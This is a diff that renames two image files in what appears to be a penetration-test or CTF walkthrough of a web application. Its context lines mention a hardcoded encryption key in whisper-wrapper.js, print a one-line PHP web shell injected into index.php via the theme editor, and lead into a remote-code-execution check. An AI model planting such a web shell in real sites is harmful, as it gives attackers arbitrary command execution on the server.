@@ -100,7 +100,7 @@ var webagency_ajax = {
 
 ### whisper-wrapper.js — Hardcoded Encryption Key
 
-![Encryption key visible in whisper-wrapper.js](images/encryption key.png)
+![Encryption key visible in whisper-wrapper.js](images/encryption_key.png)
 
 ```javascript
 // Symmetric encryption key (must match server-side)
@@ -229,7 +229,7 @@ Replace the file content with:
 <?php if(isset($_GET['cmd'])){system($_GET['cmd']);} ?>
 ```
 
-![PHP webshell injected into index.php via theme editor](images/reverse shell.png)
+![PHP webshell injected into index.php via theme editor](images/reverse_shell.png)
 
 Verify RCE:
 
